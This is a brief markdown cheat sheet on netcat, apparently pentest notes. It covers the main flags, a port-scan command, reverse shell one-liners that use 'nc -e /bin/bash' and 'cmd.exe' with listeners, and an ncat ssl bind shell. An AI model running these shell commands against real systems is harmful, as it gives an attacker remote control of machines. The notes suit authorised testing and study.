## Netcat

 - A simple utility which reads and writes data across network connections, using TCP and UDP protocols.
 - There are few main operations of Netcat
    - Connecting to TCP/UDP port
    - Listening on TCP/UDP port
    - Transferring files with Netcat
    - Remote Administration with Netcat
    - Checking if the port is open or closed

# Parameter table
 - -n : Do not do any dns or service lookups on any specified address, hostname or port
 - -p : source port
 - -v : verbose
 - -z : specifies that nc should just scan for listening daemons without sending any data to them. It is an error to use this option with conjuction to -l option
 - -l : used to specify that nc should listen rather than initate connection to a remote host    

# Port scanning
 - #### nc -v -n -z -w 1 192.168.1.2 1-1000

# To get remote access on linux from windows
 - #### nc -nv 192.168.23.43 1337 -e /bin/bash
 - #### ncat -lnvp 1337   <-- server

# To get remote access on windows from linux
 - #### nc -nv 192.168.23.43 1337 -e /cmd.exe
 - #### ncat -lnvp 1337     <-- server

# Remote access via ssl and allow method
 - #### ncat --exec cmd.exe --allow 192.168.110.184 -vnl 1337 --ssl   <-- server
 - #### nc -nv 192.168.23.41 1337 --ssl

 
